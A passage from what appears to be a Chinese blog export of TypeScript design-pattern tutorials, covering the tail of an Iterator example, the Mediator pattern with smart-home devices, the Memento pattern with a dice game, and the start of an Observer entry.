<p>#Book类：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * class Book</span><br><span class="line"> *&#x2F;</span><br><span class="line">export default class Book &#123;</span><br><span class="line">    private name: string;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * Book</span><br><span class="line">     *&#x2F;</span><br><span class="line">    constructor(name: string) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line">    public getName(): string &#123;</span><br><span class="line">        return this.name</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>#BookShelf类：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Book from &quot;.&#x2F;Book&quot;;</span><br><span class="line">import &#123; BookIterator &#125; from &quot;.&#x2F;Aggregate&quot;;</span><br><span class="line">import BookShelfIterator from &quot;.&#x2F;BookShelfIterator&quot;;</span><br><span class="line">export default class BookShelf &#123;</span><br><span class="line">    private books: Array&lt;Book&gt;;</span><br><span class="line">    private last: number &#x3D; 0;</span><br><span class="line">    constructor(maxsize: number) &#123;</span><br><span class="line">        this.books &#x3D; new Array&lt;Book&gt;(maxsize);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * appendBook</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public appendBook(book: Book): void &#123;</span><br><span class="line">        this.books[this.last] &#x3D; book;</span><br><span class="line">        this.last++;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * getBookAt</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public getBookAt(index: number): Book &#123;</span><br><span class="line">        return this.books[index]</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * getLength</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public getLength(): number &#123;</span><br><span class="line">        return this.last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * name</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public bookIterator(): BookIterator &#123;</span><br><span class="line">        return new BookShelfIterator(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>#BookShelfIterator类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> import BookShelf from &quot;.&#x2F;BookShelf&quot;;</span><br><span class="line">import Book from &quot;.&#x2F;Book&quot;;</span><br><span class="line">import &#123; BookIterator &#125; from &quot;.&#x2F;Aggregate&quot;;</span><br><span class="line">export default class BookShelfIterator implements BookIterator &#123;</span><br><span class="line">    private bookShelf: BookShelf;</span><br><span class="line">    private index: number;</span><br><span class="line">    constructor(bookShelf: BookShelf) &#123;</span><br><span class="line">        this.bookShelf &#x3D; bookShelf;</span><br><span class="line">        this.index &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * hasNext</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public hasNext(): boolean &#123;</span><br><span class="line">        if (this.index &lt; this.bookShelf.getLength()) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * next</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public next(): Book &#123;</span><br><span class="line">        const book &#x3D; this.bookShelf.getBookAt(this.index);</span><br><span class="line">        this.index++;</span><br><span class="line">        return book;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>#index入口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import BookShelf from &quot;.&#x2F;BookShelf&quot;;</span><br><span class="line">import Book from &quot;.&#x2F;Book&quot;;</span><br><span class="line"></span><br><span class="line">let bookShelf &#x3D; new BookShelf(4);</span><br><span class="line">bookShelf.appendBook(new Book(&quot;test1&quot;));</span><br><span class="line">bookShelf.appendBook(new Book(&quot;test2&quot;));</span><br><span class="line">bookShelf.appendBook(new Book(&quot;test3&quot;));</span><br><span class="line">bookShelf.appendBook(new Book(&quot;test4&quot;));</span><br><span class="line">const it &#x3D; bookShelf.bookIterator();</span><br><span class="line">while (it.hasNext()) &#123;</span><br><span class="line">    const book &#x3D; it.next();</span><br><span class="line">    console.log(book.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Mediator模式（中介者模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Mediator%E6%A8%A1%E5%BC%8F%EF%BC%88%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p><strong>中介者模式</strong>（Mediator Pattern）提供了一个中介类，该类通常处理不同类之间的通信，降低多个对象和类之间的通信复杂性，并支持松耦合，使代码易于维护。中介者模式属于行为型模式。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。</li>
<li><strong>主要解决：</strong>对象与对象之间存在大量的关联关系</li>
<li><strong>何时使用：</strong>多个类相互耦合，形成了网状结构。</li>
<li><strong>如何解决：</strong>将上述网状结构分离为星型结构。</li>
<li>**应用实例： **MVC 框架，其中C（控制器）就是 M（模型）和 V（视图）的中介者。</li>
<li><strong>优点：</strong><br>1、降低了类的复杂度，将一对多转化成了一对一。<br>2、各个类之间的解耦。<br>3、符合迪米特原则。</li>
<li><strong>缺点：</strong>中介者会庞大，变得复杂难以维护。</li>
<li><strong>使用场景：</strong><br>1、系统中对象之间存在比较复杂的引用关系，导致它们之间的依赖关系结构混乱而且难以复用该对象。<br>2、想通过一个中间类来封装多个类中的行为，而又不想生成太多的子类。</li>
</ul>
<p><em>注意事项：不应当在职责混乱的时候使用。</em></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="SmartDevice-ts-智能设备类-抽象同事角色"><a href="#SmartDevice-ts-智能设备类-抽象同事角色" class="headerlink" title="SmartDevice.ts 智能设备类(抽象同事角色)"></a>SmartDevice.ts 智能设备类(抽象同事角色)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import SmartMediator from &quot;.&#x2F;SmartMediator&quot;;</span><br><span class="line"></span><br><span class="line">export default abstract class SmartDevice &#123;</span><br><span class="line">    &#x2F;&#x2F;相关设备打开之后 使其进入准备状态</span><br><span class="line">    public abstract readyState(instruction: string): void;</span><br><span class="line">    &#x2F;&#x2F;操作该设备</span><br><span class="line">    public abstract operateDevice(instruction: string, mediator: SmartMediator): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="CurtainDevice-ts-窗帘设备-具体同事角色"><a href="#CurtainDevice-ts-窗帘设备-具体同事角色" class="headerlink" title="CurtainDevice.ts 窗帘设备(具体同事角色)"></a>CurtainDevice.ts 窗帘设备(具体同事角色)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import SmartDevice from &quot;.&#x2F;SmartDevice&quot;;</span><br><span class="line">import SmartMediator from &quot;.&#x2F;SmartMediator&quot;;</span><br><span class="line"></span><br><span class="line">export default class CurtainDevice extends SmartDevice &#123;</span><br><span class="line"></span><br><span class="line">    public operateDevice(instruction: string, mediator: SmartMediator): void &#123;</span><br><span class="line">        console.log(&#96;窗帘已$&#123;instruction&#125;&#96;);&#x2F;&#x2F;通过传入指令，打开或关闭窗帘</span><br><span class="line">        mediator.curtain(instruction);&#x2F;&#x2F;窗帘通过中介者唤醒音乐设备和洗浴设备</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public readyState(instruction: string): void &#123;</span><br><span class="line">        &#x2F;&#x2F;如果其他设备开启则调用此方法，唤醒窗帘</span><br><span class="line">        console.log(&#96;窗帘设备准备$&#123;instruction&#125;&#96;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="MusicDevice-ts-音响设备-具体同事角色"><a href="#MusicDevice-ts-音响设备-具体同事角色" class="headerlink" title="MusicDevice.ts 音响设备(具体同事角色)"></a>MusicDevice.ts 音响设备(具体同事角色)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import SmartDevice from &quot;.&#x2F;SmartDevice&quot;;</span><br><span class="line">import SmartMediator from &quot;.&#x2F;SmartMediator&quot;;</span><br><span class="line"></span><br><span class="line">export default class MusicDevice extends SmartDevice &#123;</span><br><span class="line"></span><br><span class="line">    public operateDevice(instruction: string, mediator: SmartMediator): void &#123;</span><br><span class="line">        console.log(&#96;音乐设备已$&#123;instruction&#125;&#96;);&#x2F;&#x2F;通过传入指令，打开或关闭窗帘</span><br><span class="line">        mediator.curtain(instruction);&#x2F;&#x2F;窗帘通过中介者唤醒音乐设备和洗浴设备</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public readyState(instruction: string): void &#123;</span><br><span class="line">        &#x2F;&#x2F;如果其他设备开启则调用此方法，唤醒窗帘</span><br><span class="line">        console.log(&#96;音乐设备准备$&#123;instruction&#125;&#96;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="BathDevice-ts-洗浴设备-具体同事角色"><a href="#BathDevice-ts-洗浴设备-具体同事角色" class="headerlink" title="BathDevice.ts 洗浴设备(具体同事角色)"></a>BathDevice.ts 洗浴设备(具体同事角色)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import SmartDevice from &quot;.&#x2F;SmartDevice&quot;;</span><br><span class="line">import SmartMediator from &quot;.&#x2F;SmartMediator&quot;;</span><br><span class="line"></span><br><span class="line">export default class BathDevice extends SmartDevice &#123;</span><br><span class="line"></span><br><span class="line">    public operateDevice(instruction: string, mediator: SmartMediator): void &#123;</span><br><span class="line">        console.log(&#96;洗浴设备$&#123;instruction&#125;&#96;);&#x2F;&#x2F;通过传入指令，打开或关闭窗帘</span><br><span class="line">        mediator.curtain(instruction);&#x2F;&#x2F;窗帘通过中介者唤醒音乐设备和洗浴设备</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public readyState(instruction: string): void &#123;</span><br><span class="line">        &#x2F;&#x2F;如果其他设备开启则调用此方法，唤醒窗帘</span><br><span class="line">        console.log(&#96;洗浴设备正在准备$&#123;instruction&#125;&#96;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="SmartMediator-ts-抽象中介者"><a href="#SmartMediator-ts-抽象中介者" class="headerlink" title="SmartMediator.ts 抽象中介者"></a>SmartMediator.ts 抽象中介者</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import SmartDevice from &quot;.&#x2F;SmartDevice&quot;;</span><br><span class="line"></span><br><span class="line">export default abstract class SmartMediator &#123;</span><br><span class="line">    &#x2F;&#x2F;保留所有设备的引用是为了当接收指令时可以唤醒其他设备的操作</span><br><span class="line">    public bd: SmartDevice;</span><br><span class="line">    public md: SmartDevice;</span><br><span class="line">    public cd: SmartDevice;</span><br><span class="line">    constructor(bd: SmartDevice, md: SmartDevice, cd: SmartDevice) &#123;</span><br><span class="line">        this.bd &#x3D; bd;</span><br><span class="line">        this.md &#x3D; md;</span><br><span class="line">        this.cd &#x3D; cd;</span><br><span class="line">    &#125;</span><br><span class="line">    public abstract music(instruction: string): void;</span><br><span class="line">    public abstract curtain(instruction: string): void;</span><br><span class="line">    public abstract bath(instruction: string): void;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Shape-ts-具体中介者"><a href="#Shape-ts-具体中介者" class="headerlink" title="Shape.ts 具体中介者"></a>Shape.ts 具体中介者</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import SmartDevice from &quot;.&#x2F;SmartDevice&quot;;</span><br><span class="line">import SmartMediator from &quot;.&#x2F;SmartMediator&quot;;</span><br><span class="line"></span><br><span class="line">export default class ConcreteMediator extends SmartMediator &#123;</span><br><span class="line"></span><br><span class="line">    constructor(bd: SmartDevice, cd: SmartDevice, md: SmartDevice) &#123;</span><br><span class="line">        super(bd, cd, md);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public music(instruction: string): void &#123;&#x2F;&#x2F;音乐被唤醒后，使其他设备进入准备状态</span><br><span class="line">        this.cd.readyState(instruction);&#x2F;&#x2F;调用窗帘的准备方法</span><br><span class="line">        this.bd.readyState(instruction);&#x2F;&#x2F;调用洗浴设备的准备方法</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public curtain(instruction: string): void &#123;</span><br><span class="line">        this.md.readyState(instruction);</span><br><span class="line">        this.bd.readyState(instruction);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public bath(instruction: string): void &#123;</span><br><span class="line">        this.cd.readyState(instruction);</span><br><span class="line">        this.md.readyState(instruction);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Shape-ts-模型接口"><a href="#Shape-ts-模型接口" class="headerlink" title="Shape.ts 模型接口"></a>Shape.ts 模型接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export interface Shape &#123;</span><br><span class="line">    draw(): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import SmartDevice from &quot;.&#x2F;SmartDevice&quot;;</span><br><span class="line">import BathDevice from &quot;.&#x2F;BathDevice&quot;;</span><br><span class="line">import CurtainDevice from &quot;.&#x2F;CurtainDevice&quot;;</span><br><span class="line">import MusicDevice from &quot;.&#x2F;MusicDevice&quot;;</span><br><span class="line">import ConcreteMediator from &quot;.&#x2F;ConcreteMediator&quot;;</span><br><span class="line">import SmartMediator from &quot;.&#x2F;SmartMediator&quot;;</span><br><span class="line"></span><br><span class="line">const bd: SmartDevice &#x3D; new BathDevice();</span><br><span class="line">const cd: SmartDevice &#x3D; new CurtainDevice();</span><br><span class="line">const md: SmartDevice &#x3D; new MusicDevice();</span><br><span class="line">const sm: SmartMediator &#x3D; new ConcreteMediator(bd, cd, md);&#x2F;&#x2F;把设备引用都保存在调停者中</span><br><span class="line">cd.operateDevice(&quot;open&quot;, sm); &#x2F;&#x2F;开启窗帘</span><br><span class="line">md.operateDevice(&quot;close&quot;, sm);&#x2F;&#x2F;关闭音乐</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">窗帘已open</span><br><span class="line">窗帘设备准备open</span><br><span class="line">洗浴设备正在准备open</span><br><span class="line">音乐设备已close</span><br><span class="line">窗帘设备准备close</span><br><span class="line">洗浴设备正在准备close</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-c92933af9be4cd59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="类图"></p>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li>抽象中介者（mediator）<br>定义一个接口用于和对象通信（SmartDevice）</li>
<li>具体中介者（concretemediator）<br>协调各同事对象实现协作，了解维护各个同事</li>
<li>抽象同事角色（colleague）<br>规定了同事的基本类型</li>
<li>具体同事角色（concreteColleague）<br>每个同事都知道中介者对象，要与同事通信则把通信告诉中介者</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Memento-Pattern（备忘录模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Memento-Pattern%EF%BC%88%E5%A4%87%E5%BF%98%E5%BD%95%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<h2 id="备忘录模式"><a href="#备忘录模式" class="headerlink" title="备忘录模式"></a>备忘录模式</h2><p>备忘录模式（Memento Pattern）保存一个对象的某个状态，以便在适当的时候恢复对象。备忘录模式属于行为型模式。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>使用Memento模式可以实现应用程序的以下功能</p>
<ul>
<li>Undo（撤销）</li>
<li>Redo（重做）</li>
<li>History（历史记录）</li>
<li>Snapshot（快照）<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2>手机水果和获取金钱数的掷骰子游戏<h3 id="Memento类：表示主人公"><a href="#Memento类：表示主人公" class="headerlink" title="Memento类：表示主人公"></a>Memento类：表示主人公</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * Memento类，主人公</span><br><span class="line"> *&#x2F;</span><br><span class="line">export default class Memento &#123;</span><br><span class="line">    public money: number;&#x2F;&#x2F;金钱</span><br><span class="line">    public fruits: Array&lt;string&gt;;&#x2F;&#x2F;水果</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取当前金钱</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public getMoney(): number &#123;</span><br><span class="line">        return this.money;</span><br><span class="line">    &#125;</span><br><span class="line">    constructor(money: number) &#123;</span><br><span class="line">        this.money &#x3D; money;</span><br><span class="line">        this.fruits &#x3D; new Array();</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 添加水果</span><br><span class="line">     * @param fruit 水果</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public addFruit(fruit: string) &#123;</span><br><span class="line">        this.fruits.push(fruit);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取当前水果</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public getFruits(): Array&lt;string&gt; &#123;</span><br><span class="line">        return JSON.parse(JSON.stringify(this.fruits));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
Gamer类：表示游戏主人公的类<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Memento from &quot;.&#x2F;Memento&quot;;</span><br><span class="line"></span><br><span class="line">export default class Gamer &#123;</span><br><span class="line">    private money: number;&#x2F;&#x2F;所持金钱</span><br><span class="line">    private fruits: Array&lt;string&gt; &#x3D; new Array();&#x2F;&#x2F;获得的水果</span><br><span class="line">    private fruitname: string[] &#x3D; [&quot;苹果&quot;, &quot;葡萄&quot;, &quot;香蕉&quot;, &quot;橘子&quot;];&#x2F;&#x2F;水果种类</span><br><span class="line">    constructor(money: number) &#123;&#x2F;&#x2F;构造函数</span><br><span class="line">        this.money &#x3D; money;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取当前所持金钱</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public getMoney(): number &#123;</span><br><span class="line">        return this.money;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 掷骰子游戏</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public bet(): void &#123;</span><br><span class="line">        const dice &#x3D; Math.ceil(Math.random() * 6);&#x2F;&#x2F;骰子随机数</span><br><span class="line">        if (dice &#x3D;&#x3D; 1) &#123;&#x2F;&#x2F;1金钱+100</span><br><span class="line">            this.money +&#x3D; 100;</span><br><span class="line">            console.log(&quot;所持金钱增加了。&quot;)</span><br><span class="line">        &#125; else if (dice &#x3D;&#x3D; 2) &#123;&#x2F;&#x2F;2金钱减半</span><br><span class="line">            this.money &#x2F;&#x3D; 2;</span><br><span class="line">            console.log(&quot;所持金钱减半&quot;);</span><br><span class="line">        &#125; else if (dice &#x3D;&#x3D; 6) &#123;&#x2F;&#x2F;6获取水果</span><br><span class="line">            const f &#x3D; this.getFruit();</span><br><span class="line">            console.log(&#96;获得了水果（$&#123;f&#125;）。&#96;);</span><br><span class="line">            this.fruits.push(f)</span><br><span class="line">        &#125; else &#123;&#x2F;&#x2F;其他没奖励</span><br><span class="line">            console.log(&quot;什么都没有发生。&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 创建快照</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public createMemento(): Memento &#123;</span><br><span class="line">        const m: Memento &#x3D; new Memento(this.money);</span><br><span class="line">        this.fruits.forEach((item) &#x3D;&gt; &#123;</span><br><span class="line">            if (item.indexOf(&quot;好吃的&quot;) &#x3D;&#x3D; 0) &#123;&#x2F;&#x2F;只保存还吃的水果</span><br><span class="line">                m.addFruit(item)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return m;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 撤销操作</span><br><span class="line">     * @param memento 快照</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public restoreMemento(memento: Memento) &#123;</span><br><span class="line">        this.money &#x3D; memento.money;</span><br><span class="line">        this.fruits &#x3D; memento.getFruits();</span><br><span class="line">    &#125;</span><br><span class="line">    public toString(): string &#123;</span><br><span class="line">        return &#96;[money &#x3D; $&#123;this.money&#125;, fruits &#x3D; $&#123;JSON.stringify(this.fruits)&#125;]&#96;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取水果，增加随机数，只有大于0.5才表示水果是好吃的</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private getFruit(): string &#123;</span><br><span class="line">        let prefix &#x3D; &quot;&quot;;</span><br><span class="line">        if (Math.random() &gt;&#x3D; 0.5) &#123;</span><br><span class="line">            prefix &#x3D; &quot;好吃的&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &#96;$&#123;prefix&#125;$&#123;this.fruitname[Math.floor(Math.random() * this.fruitname.length)]&#125; &#96;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
#index.ts运行<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Gamer from &quot;.&#x2F;Gamer&quot;;</span><br><span class="line">import Memento from &quot;.&#x2F;Memento&quot;;</span><br><span class="line"></span><br><span class="line">const gamer: Gamer &#x3D; new Gamer(100);</span><br><span class="line">let memento: Memento &#x3D; gamer.createMemento();</span><br><span class="line">for (let i &#x3D; 0; i &lt; 100; i++) &#123;</span><br><span class="line">    console.log(&#96;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;$&#123;i&#125;&#96;);</span><br><span class="line">    console.log(&#96;当前状态：$&#123;gamer&#125;&#96;);</span><br><span class="line">    gamer.bet();</span><br><span class="line">    console.log(&#96;所持金钱为$&#123;gamer.getMoney()&#125;元&#96;);</span><br><span class="line">    console.log(&#96;$&#123;gamer.getMoney()&#125;元,$&#123;memento.getMoney()&#125;&#96;);</span><br><span class="line">    if (gamer.getMoney() &gt; memento.getMoney()) &#123;</span><br><span class="line">        console.log(&quot;所持金钱增加了许多，因此保存当前游戏状态&quot;);</span><br><span class="line">        memento &#x3D; gamer.createMemento();</span><br><span class="line">    &#125; else if (gamer.getMoney() &lt; memento.getMoney() &#x2F; 2) &#123;</span><br><span class="line">        console.log(&quot;所持金钱减少了许多，因此将游戏恢复至以前的状态&quot;);</span><br><span class="line">        gamer.restoreMemento(memento);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;0</span><br><span class="line">当前状态：[money &#x3D; 100, fruits &#x3D; []]</span><br><span class="line">所持金钱增加了。</span><br><span class="line">所持金钱为200元</span><br><span class="line">200元,100</span><br><span class="line">所持金钱增加了许多，因此保存当前游戏状态</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;1</span><br><span class="line">当前状态：[money &#x3D; 200, fruits &#x3D; []]</span><br><span class="line">所持金钱减半</span><br><span class="line">所持金钱为100元</span><br><span class="line">100元,200</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;2</span><br><span class="line">当前状态：[money &#x3D; 100, fruits &#x3D; []]</span><br><span class="line">所持金钱增加了。</span><br><span class="line">所持金钱为200元</span><br><span class="line">200元,200</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;3</span><br><span class="line">当前状态：[money &#x3D; 200, fruits &#x3D; []]</span><br><span class="line">所持金钱减半</span><br><span class="line">所持金钱为100元</span><br><span class="line">100元,200</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;4</span><br><span class="line">当前状态：[money &#x3D; 100, fruits &#x3D; []]</span><br><span class="line">什么都没有发生。</span><br><span class="line">所持金钱为100元</span><br><span class="line">100元,200</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;5</span><br><span class="line">当前状态：[money &#x3D; 100, fruits &#x3D; []]</span><br><span class="line">什么都没有发生。</span><br><span class="line">所持金钱为100元</span><br><span class="line">100元,200</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;6</span><br><span class="line">当前状态：[money &#x3D; 100, fruits &#x3D; []]</span><br><span class="line">什么都没有发生。</span><br><span class="line">所持金钱为100元</span><br><span class="line">100元,200</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;7</span><br><span class="line">当前状态：[money &#x3D; 100, fruits &#x3D; []]</span><br><span class="line">所持金钱增加了。</span><br><span class="line">所持金钱为200元</span><br><span class="line">200元,200</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;8</span><br><span class="line">当前状态：[money &#x3D; 200, fruits &#x3D; []]</span><br><span class="line">什么都没有发生。</span><br><span class="line">所持金钱为200元</span><br><span class="line">200元,200</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;9</span><br><span class="line">当前状态：[money &#x3D; 200, fruits &#x3D; []]</span><br><span class="line">什么都没有发生。</span><br><span class="line">所持金钱为200元</span><br><span class="line">200元,200</span><br></pre></td></tr></table></figure>
##类图<br><img src="https://upload-images.jianshu.io/upload_images/10024246-965b1afc66f88f92.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="类图"></li>
</ul>
<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><ul>
<li>Originator（生成者）<br>Originator角色保存自己的最新状态时生产Memento角色，当吧以前保存的Memento角色传递给Originator角色时，它会将自己恢复至生成该Memento角色时的状态。在示例中Gamer类扮演该角色</li>
<li>Memento（备忘录）<br>Memento角色会将Originator角色的内部信息整合在一起，在Memento角色中虽然保存了Originator角色信息，但不会向外部公开这些信息<br>Memento角色有以下两种接口（API）</li>
<li><code>wide interface---宽接口</code><br>宽接口是指所有用于获取恢复对象状态信息的方法的集合。由于宽接口会暴露所有信息，所以能使用宽接口的只有Originator角色</li>
<li><code>narrow interface ---窄接口</code><br>可以通过窄接口获取的Memento的信息有限，有效放在信息泄露</li>
</ul>
<p>示例中Memento类扮演该角色</p>
<ul>
<li>Caretaker（负责人）<br>当Caretaker角色想要保存当前Originator角色状态时，会通知Originator角色，Originator接到同事后会生成Memento角色的实例并返回给Caretaker角色。为了Originator状态恢复，Caretaker会一直保存Memento实例。<br>示例中index扮演该角色</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Observer模式（观察者模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Observer%E6%A8%A1%E5%BC%8F%EF%BC%88%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p>观察者模式（Observer Pattern）:当观察对象的状态变化时，会自动通知给观察者。观察者模式属于行为型模式。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>当被观察对象的状态变化时，所有依赖于它的对象都得到通知并被自动更新。</li>
<li><strong>主要解决：</strong>被观察对象状态改变给其他对象通知的问题，而且要考虑到易用和低耦合，保证高度的协作。</li>
<li><strong>何时使用：</strong>被观察对象的状态发生改变，所有的依赖对象（观察者对象）都将得到通知，进行广播通知。</li>
<li><strong>如何解决：</strong>使用面向对象技术，可以将这种依赖关系弱化。</li>
<li><strong>优点：</strong><br>1、观察者和被观察者是抽象耦合的。<br>2、建立一套触发机制。</li>
<li><strong>缺点：</strong><br>1、如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。<br>2、如果在观察者和观察目标之间有循环依赖的话，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。<br>3、观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。</li>
</ul>
